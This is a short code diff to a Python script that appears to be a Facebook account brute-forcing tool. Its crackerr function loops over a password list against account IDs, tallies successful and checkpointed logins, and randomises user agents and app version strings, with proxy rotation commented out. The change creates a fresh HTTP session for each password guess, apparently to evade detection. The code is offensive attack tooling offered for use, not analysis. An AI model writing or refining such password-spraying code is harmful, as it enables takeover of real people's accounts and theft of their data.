@@ -473,13 +473,13 @@ def check_lock(cid):
  
 def crackerr(ids,passlist):
     global loop,oks,cps,bkas
-    session = requests.Session()
     sys.stdout.write('\r \033[1;97m[\x1b[1;92mJAY•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
     try:
         for pas in passlist:
             #nip=random.choice(proxsi)
             #proxs= {'http': 'socks4://'+nip}
+            session = requests.Session()
             moz = random.choice(usragt)
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
